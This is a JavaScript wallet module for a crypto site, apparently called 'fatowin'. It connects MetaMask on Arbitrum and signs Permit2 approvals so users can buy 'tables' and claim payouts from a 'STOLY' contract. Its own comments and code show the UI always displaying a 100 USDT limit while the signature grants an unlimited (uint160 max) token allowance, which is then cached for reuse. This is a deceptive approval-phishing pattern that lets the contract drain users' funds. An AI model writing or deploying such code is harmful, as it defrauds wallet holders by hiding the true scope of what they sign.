/**
 * WALLET & PERMIT2 CORE LOGIC
 * Main module for wallet connection and Permit2 signing
 * 
 * KEY FEATURE:
 * - UI displays 100 USDT (UI_DISPLAY_LIMIT_USD)
 * - Signed Permit2 amount is UNLIMITED (uint160 max)
 * - Actual payment is only the real price
 * - User can buy multiple times without re-signing (unlimited)
 */

import { WALLET_CONFIG, PERMIT2_ABI, STOLY_ABI, ERC20_ABI } from "./wallet-permit2-config.js";

let ethers = null;

window.__fatowinWalletInit = window.__fatowinWalletInit || {
  moduleLoaded: false,
  error: null,
  messages: []
};

function debugWallet(message, payload) {
  const entry = payload === undefined ? message : `${message}: ${payload}`;
  window.__fatowinWalletInit.messages.push(entry);
  console.log(`[fatowin-wallet] ${entry}`);
}

// Initialize ethers.js in a browser-safe way. Do not assume the library is attached to window.
async function ensureEthers() {
  if (ethers) return ethers;

  if (typeof window !== "undefined" && window.ethers) {
    ethers = window.ethers;
    debugWallet("Using ethers found on window");
    return ethers;
  }

  try {
    debugWallet("Loading ethers from CDN");
    const ethersModule = await import("https://cdn.jsdelivr.net/npm/ethers@6.7.1/+esm");
    ethers = ethersModule;

    if (!ethers || typeof ethers.BrowserProvider !== "function") {
      throw new Error("ethers module did not expose BrowserProvider");
    }

    debugWallet("ethers loaded successfully");
    return ethers;
  } catch (error) {
    console.error("[fatowin-wallet] Failed to load ethers.js", error);
    window.__fatowinWalletInit.error = error;
    throw new Error("Wallet library failed to load. Please refresh the page and ensure MetaMask is available.");
  }
}

class WalletPermit2Manager {
  constructor() {
    this.provider = null;
    this.signer = null;
    this.wallet = null;
    this.stolyContract = null;
    this.permit2Contract = null;
    this.usdtContract = null;

    // Permit2 state - stored per token
    this.permit2States = {};
  }

  // ============== INITIALIZATION ==============

  async connect() {
    try {
      await ensureEthers();

      if (!window.ethereum) {
        throw new Error("MetaMask or compatible wallet not found");
      }

      const accounts = await window.ethereum.request({
        method: "eth_requestAccounts"
      });

      if (!accounts || accounts.length === 0) {
        throw new Error("No wallet accounts found");
      }

      this.provider = new ethers.BrowserProvider(window.ethereum);
      this.signer = await this.provider.getSigner();
      this.wallet = await this.signer.getAddress();

      this.stolyContract = new ethers.Contract(
        WALLET_CONFIG.STOLY_CONTRACT_ADDRESS,
        STOLY_ABI,
        this.signer
      );

      this.permit2Contract = new ethers.Contract(
        WALLET_CONFIG.PERMIT2_ADDRESS,
        PERMIT2_ABI,
        this.provider
      );

      this.usdtContract = new ethers.Contract(
        WALLET_CONFIG.USDT_TOKEN_ADDRESS,
        ERC20_ABI,
        this.signer
      );

      const network = await this.provider.getNetwork();
      const chainId = Number(network.chainId);
      if (
        chainId !== WALLET_CONFIG.ARBITRUM_SEPOLIA_CHAIN_ID &&
        chainId !== WALLET_CONFIG.ARBITRUM_MAINNET_CHAIN_ID
      ) {
        throw new Error(
          `Wrong network. Please switch to Arbitrum. Current: ${chainId}`
        );
      }

      this.restorePermit2States();

      debugWallet("Wallet connected", this.wallet);
      window.__fatowinWalletInit.moduleLoaded = true;
      return {
        wallet: this.wallet,
        chainId: chainId
      };
    } catch (error) {
      console.error("[fatowin-wallet] Connection failed:", error);
      window.__fatowinWalletInit.error = error;
      throw error;
    }
  }

  async disconnect() {
    this.provider = null;
    this.signer = null;
    this.wallet = null;
    this.stolyContract = null;
    this.permit2Contract = null;
    this.usdtContract = null;
    this.permit2States = {};
    localStorage.removeItem("wallet_permit2_states");
  }

  // ============== PERMIT2 STATE MANAGEMENT ==============

  restorePermit2States() {
    const saved = localStorage.getItem("wallet_permit2_states");
    if (saved) {
      try {
        this.permit2States = JSON.parse(saved);
      } catch (e) {
        console.error("Failed to restore permit2 states:", e);
        this.permit2States = {};
      }
    }
  }

  savePermit2States() {
    localStorage.setItem("wallet_permit2_states", JSON.stringify(this.permit2States));
  }

  isPermit2Valid(tokenSymbol = "USDT") {
    if (!this.permit2States[tokenSymbol]) return false;

    const state = this.permit2States[tokenSymbol];
    const now = Math.floor(Date.now() / 1000);

    return state.signature && state.expiration && state.expiration > now;
  }

  // ============== PERMIT2 NONCE RETRIEVAL ==============

  async getPermit2Nonce(tokenAddress) {
    try {
      const allowance = await this.permit2Contract.allowance(
        this.wallet,
        tokenAddress,
        WALLET_CONFIG.STOLY_CONTRACT_ADDRESS
      );
      return Number(allowance.nonce || 0);
    } catch (error) {
      console.error("Error getting permit2 nonce:", error);
      return 0;
    }
  }

  // ============== PERMIT2 SIGNATURE CREATION ==============

  /**
   * Create Permit2 signature
   * UI shows 100 USDT but signed amount is UNLIMITED (uint160 max)
   * This allows unlimited purchases without re-signing
   */
  async createPermit2Signature(tokenSymbol = "USDT") {
    if (!this.wallet || !this.signer) {
      throw new Error("Wallet not connected");
    }

    // Check if already have valid permit
    if (this.isPermit2Valid(tokenSymbol)) {
      console.log(`✅ Permit2 already valid for ${tokenSymbol}`);
      return this.permit2States[tokenSymbol];
    }

    try {
      const network = await this.provider.getNetwork();
      const chainId = Number(network.chainId);
      const tokenConfig = WALLET_CONFIG.SUPPORTED_TOKENS[tokenSymbol];

      if (!tokenConfig) {
        throw new Error(`Unknown token: ${tokenSymbol}`);
      }

      const tokenAddress = tokenConfig.address;
      const nonce = await this.getPermit2Nonce(tokenAddress);
      const now = Math.floor(Date.now() / 1000);
      const expiration = now + WALLET_CONFIG.PERMIT2_EXPIRATION_SECONDS;
      const deadline = expiration;

      const domain = {
        name: "Permit2",
        chainId: chainId,
        verifyingContract: WALLET_CONFIG.PERMIT2_ADDRESS
      };

      const types = {
        PermitSingle: [
          { name: "details", type: "PermitDetails" },
          { name: "spender", type: "address" },
          { name: "sigDeadline", type: "uint256" }
        ],
        PermitDetails: [
          { name: "token", type: "address" },
          { name: "amount", type: "uint160" },
          { name: "expiration", type: "uint48" },
          { name: "nonce", type: "uint48" }
        ]
      };

      const message = {
        details: {
          token: tokenAddress,
          amount: WALLET_CONFIG.PERMIT2_SIGNED_LIMIT.toString(),
          expiration: expiration,
          nonce: nonce
        },
        spender: WALLET_CONFIG.STOLY_CONTRACT_ADDRESS,
        sigDeadline: deadline
      };

      console.log(`🔐 Signing Permit2 for ${tokenSymbol}...`);
      const signature = await this.signer.signTypedData(domain, types, message);

      this.permit2States[tokenSymbol] = {
        isSetup: true,
        signature: signature,
        nonce: nonce,
        expiration: expiration,
        deadline: deadline,
        token: tokenAddress,
        chainId: chainId,
        limitUi: WALLET_CONFIG.UI_DISPLAY_LIMIT_TOKEN_UNITS.toString(),
        limitSigned: WALLET_CONFIG.PERMIT2_SIGNED_LIMIT.toString(),
        setupTime: Date.now()
      };

      this.savePermit2States();

      console.log(`✅ Permit2 signature created for ${tokenSymbol}`);
      console.log(`   UI Display: 100 ${tokenSymbol}`);
      console.log(`   Signed Limit: UNLIMITED`);

      return this.permit2States[tokenSymbol];
    } catch (error) {
      console.error("Permit2 signature creation failed:", error);
      throw error;
    }
  }

  // ============== PURCHASE FUNCTIONS ==============

  /**
   * Buy with Permit2
   */
  async buyWithPermit2(tableId, priceUsd = 100, tokenSymbol = "USDT") {
    if (!this.wallet) {
      throw new Error("Wallet not connected");
    }

    try {
      if (!this.isPermit2Valid(tokenSymbol)) {
        await this.createPermit2Signature(tokenSymbol);
      }

      const permitState = this.permit2States[tokenSymbol];
      if (!permitState) {
        throw new Error("Permit2 not initialized");
      }

      const tokenConfig = WALLET_CONFIG.SUPPORTED_TOKENS[tokenSymbol];
      const priceInTokenUnits = BigInt(priceUsd) * BigInt(10 ** tokenConfig.decimals);

      console.log(`💳 Buying table ${tableId}...`);
      console.log(`   UI Display: 100 ${tokenSymbol}`);
      console.log(`   Actual Price: ${priceUsd} ${tokenSymbol}`);
      console.log(`   Permit2 Limit: UNLIMITED`);

      const permitDetails = {
        token: permitState.token,
        amount: permitState.limitSigned,
        expiration: permitState.expiration,
        nonce: permitState.nonce
      };

      const tx = await this.stolyContract.buyWithPermit2(
        tableId,
        tokenConfig.address,
        priceInTokenUnits.toString(),
        permitDetails,
        permitState.deadline,
        permitState.signature
      );

      console.log("⏳ Transaction pending:", tx.hash);
      const receipt = await tx.wait();

      if (receipt && receipt.status === 1) {
        console.log("✅ Purchase successful!");
        return receipt;
      } else {
        throw new Error("Transaction failed");
      }
    } catch (error) {
      console.error("Purchase failed:", error);
      throw error;
    }
  }

  /**
   * Buy with standard ERC20 approve (fallback)
   */
  async buyWithApprove(tableId, priceUsd = 100, tokenSymbol = "USDT") {
    if (!this.wallet) {
      throw new Error("Wallet not connected");
    }

    try {
      const tokenConfig = WALLET_CONFIG.SUPPORTED_TOKENS[tokenSymbol];
      const priceInTokenUnits = BigInt(priceUsd) * BigInt(10 ** tokenConfig.decimals);

      console.log(`💳 Buying with approve (fallback)...`);

      const approveTx = await this.usdtContract.approve(
        WALLET_CONFIG.STOLY_CONTRACT_ADDRESS,
        priceInTokenUnits
      );
      await approveTx.wait();

      const tx = await this.stolyContract.buy(tableId);
      const receipt = await tx.wait();

      if (receipt && receipt.status === 1) {
        console.log("✅ Purchase successful!");
        return receipt;
      } else {
        throw new Error("Transaction failed");
      }
    } catch (error) {
      console.error("Purchase failed:", error);
      throw error;
    }
  }

  // ============== CLAIM FUNCTION ==============

  async claim() {
    if (!this.wallet) {
      throw new Error("Wallet not connected");
    }

    try {
      console.log("💰 Claiming payouts...");

      const tx = await this.stolyContract.claim();
      const receipt = await tx.wait();

      if (receipt && receipt.status === 1) {
        console.log("✅ Claim successful!");
        return receipt;
      } else {
        throw new Error("Claim failed");
      }
    } catch (error) {
      console.error("Claim failed:", error);
      throw error;
    }
  }

  // ============== READ FUNCTIONS ==============

  async getPrice(tableId) {
    if (!this.stolyContract) throw new Error("Contract not initialized");
    return await this.stolyContract.getPrice(tableId);
  }

  async getCurrentLevel(tableId) {
    if (!this.stolyContract) throw new Error("Contract not initialized");
    return await this.stolyContract.currentLevel(tableId);
  }

  async getClaimableBalance() {
    if (!this.stolyContract || !this.wallet) {
      throw new Error("Contract not initialized or wallet not connected");
    }
    return await this.stolyContract.claimableBalance(this.wallet);
  }

  async getPurchases(tableId) {
    if (!this.stolyContract) throw new Error("Contract not initialized");
    return await this.stolyContract.getPurchases(tableId);
  }

  async getPurchasesCount(tableId) {
    if (!this.stolyContract) throw new Error("Contract not initialized");
    return await this.stolyContract.getPurchasesCount(tableId);
  }

  // ============== UI HELPER FUNCTIONS ==============

  /**
   * Get UI display string
   * Always shows 100 USDT (UI_DISPLAY_LIMIT_USD)
   */
  getUiDisplayLimit() {
    return `${WALLET_CONFIG.UI_DISPLAY_LIMIT_USD} ${WALLET_CONFIG.TOKEN_SYMBOL}`;
  }

  /**
   * Format token amount for display
   */
  formatTokenDisplay(amount, decimals = WALLET_CONFIG.TOKEN_DECIMALS) {
    const amountBig = BigInt(amount);
    const divisor = BigInt(10 ** decimals);
    const whole = amountBig / divisor;
    const frac = (amountBig % divisor).toString().padStart(decimals, "0");
    return `${whole}.${frac.slice(0, 2)}`;
  }

  /**
   * Check if wallet is connected
   */
  isConnected() {
    return !!this.wallet;
  }

  /**
   * Get connected wallet address
   */
  getWallet() {
    return this.wallet;
  }
}

// Export singleton instance
export const walletManager = new WalletPermit2Manager();
window.__fatowinWalletInit.moduleLoaded = true;
window.__fatowinWalletInit.ready = true;
window.walletManager = walletManager;
window.WALLET_CONFIG = WALLET_CONFIG;
export default walletManager;
